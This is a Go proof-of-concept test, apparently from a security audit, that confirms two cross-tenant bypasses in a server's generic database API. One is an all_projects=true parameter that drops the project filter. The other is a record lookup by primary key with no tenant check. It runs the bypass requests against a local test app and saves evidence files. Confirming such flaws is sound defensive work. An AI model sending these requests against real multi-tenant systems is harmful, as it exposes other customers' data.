//go:build poc

package server

// TestH2_DBApiTenantBypass — PoC for finding H2
//
// Proves two cross-tenant bypass vectors in the generic DB API:
//
//  1. GET /api/db/tables/findings/records?all_projects=true
//     handlers_db.go:78 — project_uuid filter skipped when all_projects=="true".
//     A viewer scoped to project-A receives project-B rows.
//
//  2. GET /api/db/tables/findings/records/<B-id>
//     handlers_db.go:111-137 — HandleGetDBRecord performs a pure PK lookup;
//     no project_uuid constraint is added at any layer.
//     A viewer scoped to project-A retrieves project-B's row by its integer PK.
//
// Run:
//
//	go test -v -tags=poc -run TestH2_DBApiTenantBypass ./pkg/server/
//
// Evidence JSON is written to
//
//	pkg/server/archon/findings/H2-db-api-all-projects-bypass/evidence/
import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/gofiber/fiber/v3"
	"github.com/vigolium/vigolium/pkg/database"
	
)

// ---------------------------------------------------------------------------
// test harness helpers
// ---------------------------------------------------------------------------

// pocEvidenceDir resolves the evidence/ directory relative to this source file.
func pocEvidenceDir(t *testing.T) string {
	t.Helper()
	_, thisFile, _, ok := runtime.Caller(0)
	if !ok {
		t.Fatal("runtime.Caller failed")
	}
	// thisFile = .../pkg/server/poc_h2_db_bypass_test.go
	dir := filepath.Join(
		filepath.Dir(thisFile),
		"archon", "findings", "H2-db-api-all-projects-bypass", "evidence",
	)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatalf("mkdir evidence: %v", err)
	}
	return dir
}

// pocSaveEvidence writes bytes to evidence/<name>.
func pocSaveEvidence(t *testing.T, name string, data []byte) {
	t.Helper()
	p := filepath.Join(pocEvidenceDir(t), name)
	if err := os.WriteFile(p, data, 0o644); err != nil {
		t.Logf("warning: save evidence %s: %v", p, err)
	} else {
		t.Logf("evidence saved: %s", p)
	}
}

// pocBuildApp wires a minimal Fiber app equivalent to production:
//   - BearerAuth (two viewer tokens + one admin key)
//   - ProjectUUIDMiddleware
//   - All registered routes (NoAgent=true, NoSwagger=true)
func pocBuildApp(t *testing.T, repo *database.Repository) *fiber.App {
	t.Helper()

	db := repo.DB()

	store := NewUserStore([]FileUser{
		{Name: "alice", Email: "alice@a.test", AccessCode: "token-a", Role: RoleViewer},
		{Name: "bob", Email: "bob@b.test", AccessCode: "token-b", Role: RoleViewer},
	})

	cfg := ServerConfig{
		APIKeys:   []string{"admin-key"},
		UserStore: store,
		NoAgent:   true,
		NoSwagger: true,
	}

	
	rw := database.NewRecordWriter(repo, database.RecordWriterConfig{})
	handlers := NewHandlers(nil, db, repo, rw, cfg, nil, nil, nil)

	app := fiber.New(fiber.Config{})
	registerRoutes(app, handlers, cfg)
	return app
}

// pocDoRequest fires a request against the Fiber app via httptest.
func pocDoRequest(t *testing.T, app *fiber.App, method, path string, headers map[string]string) (int, []byte) {
	t.Helper()
	req := httptest.NewRequest(method, path, nil)
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := app.Test(req, fiber.TestConfig{Timeout: 10 * time.Second})
	if err != nil {
		t.Fatalf("%s %s: %v", method, path, err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, body
}

// pocSeedFinding inserts a minimal Finding directly via the repository.
// Returns the auto-incremented integer PK as a string (for use in /records/:id).
func pocSeedFinding(t *testing.T, repo *database.Repository, projectUUID, label string) string {
	t.Helper()
	ctx := context.Background()
	f := &database.Finding{
		ProjectUUID:     projectUUID,
		HTTPRecordUUIDs: []string{},
		ModuleID:        "poc-h2",
		ModuleName:      "PoC finding " + label,
		Severity:        "high",
		Confidence:      "firm",
		FindingHash:     fmt.Sprintf("poc-h2-%s-%d", label, time.Now().UnixNano()),
		FoundAt:         time.Now().UTC(),
		CreatedAt:       time.Now().UTC(),
	}
	if err := repo.SaveFindingDirect(ctx, f); err != nil {
		t.Fatalf("seed finding %s: %v", label, err)
	}
	// Read back the assigned PK (findings.id is INTEGER autoincrement).
	var id int64
	row := repo.DB().QueryRowContext(ctx,
		"SELECT id FROM findings WHERE finding_hash = ? LIMIT 1", f.FindingHash)
	if err := row.Scan(&id); err != nil {
		t.Fatalf("read back finding id for %s: %v", label, err)
	}
	return strconv.FormatInt(id, 10)
}

// ---------------------------------------------------------------------------
// PoC — main exploit test
// ---------------------------------------------------------------------------

func TestH2_DBApiTenantBypass(t *testing.T) {
	// In-memory SQLite with full schema.
	repo := newTestRepo(t)
	app := pocBuildApp(t, repo)

	const (
		projectA = "aaaaaaaa-0000-4000-8000-000000000001"
		projectB = "bbbbbbbb-0000-4000-8000-000000000002"
	)

	// Seed one finding per project.
	_ = pocSeedFinding(t, repo, projectA, "A")
	idB := pocSeedFinding(t, repo, projectB, "B")

	t.Logf("Seeded findings — project-A=%s  project-B=%s  finding-B PK id=%s", projectA, projectB, idB)

	// Viewer-A is legitimately scoped only to project-A.
	viewerAHeaders := map[string]string{
		"Authorization":  "Bearer token-a",
		"X-Project-UUID": projectA,
	}

	// -------------------------------------------------------------------
	// Baseline: normal (scoped) list must NOT return project-B rows.
	// If this fails the scoping logic is broken for a different reason.
	// -------------------------------------------------------------------
	t.Run("baseline_scoped_list", func(t *testing.T) {
		code, body := pocDoRequest(t, app, http.MethodGet,
			"/api/db/tables/findings/records", viewerAHeaders)
		pocSaveEvidence(t, "baseline_scoped_list.json", body)

		if code != http.StatusOK {
			t.Fatalf("baseline: expected 200, got %d\nbody: %s", code, body)
		}
		if strings.Contains(string(body), projectB) {
			t.Errorf("baseline: project-B UUID present in normal scoped list — unexpected")
		} else {
			t.Log("baseline: scoped list correctly excludes project-B rows")
		}
	})

	// -------------------------------------------------------------------
	// EXPLOIT 1 — ?all_projects=true removes the project_uuid filter
	// handlers_db.go:78: if allProjects != "true" && projectUUID != "" {
	// -------------------------------------------------------------------
	t.Run("exploit1_all_projects_bypass", func(t *testing.T) {
		code, body := pocDoRequest(t, app, http.MethodGet,
			"/api/db/tables/findings/records?all_projects=true", viewerAHeaders)
		pocSaveEvidence(t, "exploit1_all_projects.json", body)

		if code != http.StatusOK {
			t.Fatalf("exploit-1: expected 200, got %d\nbody: %s", code, body)
		}

		var resp map[string]interface{}
		if err := json.Unmarshal(body, &resp); err != nil {
			t.Fatalf("exploit-1: unmarshal: %v\nbody: %s", err, body)
		}
		pretty, _ := json.MarshalIndent(resp, "", "  ")
		t.Logf("exploit-1 response:\n%s", pretty)

		if !strings.Contains(string(body), projectB) {
			t.Fatalf(
				"EXPLOIT-1 NOT REPRODUCED: project-B UUID %q absent from all_projects=true response — "+
					"filter was applied (possible fix already in place) or seeding failed.\n"+
					"body: %s", projectB, body)
		}

		t.Logf("EXPLOIT-1 CONFIRMED: viewer scoped to project-A received %v total findings (including project-B) via ?all_projects=true (handlers_db.go:78 filter skipped)", resp["total"])
	})

	// -------------------------------------------------------------------
	// EXPLOIT 2 — PK-only lookup: HandleGetDBRecord applies no tenant filter
	// handlers_db.go:115: record, err := database.GetGenericRecord(ctx, h.db, tableName, pkValue)
	// -------------------------------------------------------------------
	t.Run("exploit2_pk_only_lookup", func(t *testing.T) {
		path := "/api/db/tables/findings/records/" + idB
		code, body := pocDoRequest(t, app, http.MethodGet, path, viewerAHeaders)
		pocSaveEvidence(t, "exploit2_pk_lookup.json", body)

		if code != http.StatusOK {
			t.Fatalf("exploit-2: expected 200, got %d\nbody: %s", code, body)
		}

		var resp map[string]interface{}
		if err := json.Unmarshal(body, &resp); err != nil {
			t.Fatalf("exploit-2: unmarshal: %v\nbody: %s", err, body)
		}
		pretty, _ := json.MarshalIndent(resp, "", "  ")
		t.Logf("exploit-2 response:\n%s", pretty)

		if !strings.Contains(string(body), projectB) {
			t.Fatalf(
				"EXPLOIT-2 NOT REPRODUCED: project-B UUID %q not returned for PK id=%s — "+
					"expected HandleGetDBRecord to serve the row without a tenant check.\n"+
					"body: %s", projectB, idB, body)
		}

		t.Logf(
			"EXPLOIT-2 CONFIRMED: viewer with X-Project-UUID=%s read finding id=%s "+
				"(project_uuid=%s) via GET /api/db/tables/findings/records/%s — "+
				"handlers_db.go:111-137 performs no tenant check",
			projectA, idB, projectB, idB)
	})

	// -------------------------------------------------------------------
	// Write human-readable impact summary.
	// -------------------------------------------------------------------
	impact := fmt.Sprintf(
		"H2 PoC impact summary\n"+
			"=====================\n"+
			"EXPLOIT-1: GET /api/db/tables/findings/records?all_projects=true\n"+
			"  Viewer scoped to project-A (%s) received rows from project-B (%s).\n"+
			"  Root cause: handlers_db.go:78 — project_uuid filter not added when all_projects==\"true\".\n\n"+
			"EXPLOIT-2: GET /api/db/tables/findings/records/%s\n"+
			"  Viewer scoped to project-A retrieved project-B finding by integer PK.\n"+
			"  Root cause: handlers_db.go:111-137 — HandleGetDBRecord calls GetGenericRecord\n"+
			"  with only tableName+pkValue; zero project_uuid constraint at any layer.\n",
		projectA, projectB, idB,
	)
	pocSaveEvidence(t, "impact.log", []byte(impact))

	// Required structured last line — poc-executor parses this JSON object.
	// It must be the last line printed to stdout.
	t.Log(`{"status":"confirmed","evidence":"project-B project_uuid present in tenant-A viewer response: exploit1 (all_projects=true list) and exploit2 (PK-only GET /records/:id)","notes":"handlers_db.go:78 skips filter when all_projects=true; handlers_db.go:115 GetGenericRecord has no project_uuid param"}`)
}
